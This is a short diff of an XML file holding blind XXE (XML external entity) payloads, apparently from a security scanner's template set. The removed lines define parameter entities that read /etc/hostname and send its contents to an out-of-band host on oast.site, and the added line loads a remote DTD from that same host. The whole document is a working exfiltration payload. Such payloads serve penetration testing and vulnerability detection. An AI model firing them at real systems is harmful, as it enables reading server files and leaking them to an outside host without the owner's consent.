@@ -1,4 +1,1 @@
-<!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://nv2krib9rythidhbaumoeychhzu4w7lsv.oast.site?x=%file;'>">
-%eval;
-%exfil;
+<!DOCTYPE foo [ <!ENTITY % xml SYSTEM "https://nv2krib9rythidhbaumoeychhzu4w7lsv.oast.site"> %xml;]>
